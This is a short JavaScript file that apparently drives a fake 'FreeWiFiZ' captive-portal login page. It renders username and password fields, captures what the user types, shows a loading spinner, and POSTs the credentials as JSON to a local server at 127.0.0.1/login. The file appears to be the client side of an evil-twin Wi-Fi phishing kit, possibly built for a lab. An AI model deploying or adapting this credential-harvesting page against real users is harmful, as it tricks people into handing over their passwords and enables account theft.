console.log("test");





class login{
	constructor() {
		this.stage = 1;
		this.input_area_elm = document.getElementById('input-area');
		this.username_pass_html = '<div class="input-box"><input type="text" class="input-field" id="login_first" data-key="login_first" autocomplete="off" required><label for="login_first">Username</label></div><div class="input-box"><input type="password" class="input-field" id="login_pass" data-key="login_pass" autocomplete="off" required><label for="login_pass">Password</label></div>';

		this.loading_gif_html = '<div class="loader-waiting" id="loader_waiting"></div>';
		this.login_data = {'page':'FreeWiFiZ','login_first':'','login_pass':''};
	}

	
	stager(){
		if(this.stage == 1){
			this.input_area_elm.innerHTML = this.username_pass_html;
			
		}
		if(this.stage == 2){

			this.input_area_elm.innerHTML = this.loading_gif_html;
			setTimeout(function (){
				Login.submit_btn();
			}, 2500);
			console.log(this.login_data);
			fetch("http://127.0.0.1/login", {
				method: "POST",
				body: JSON.stringify(this.login_data),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			});
		}
		
	}
	submit_btn(){
		var login_first = document.getElementById('login_first');
		var login_pass = document.getElementById('login_pass');
		var loader_waiting = document.getElementById('loader_waiting');
		if(login_first != undefined && login_pass != undefined){
			if(login_first.value == '' && login_pass.value == ''){return;}
			if(this.login_data[login_first.dataset.key] == undefined && this.login_data[login_pass.dataset.key] == undefined){return;}
			this.login_data[login_first.dataset.key] = login_first.value;
			this.login_data[login_pass.dataset.key] = login_pass.value;
		}
		
		this.stage += 1;
		this.stager();
		// console.log(this.stage);
	}

	
	
}
Login = new login()
Login.stager();
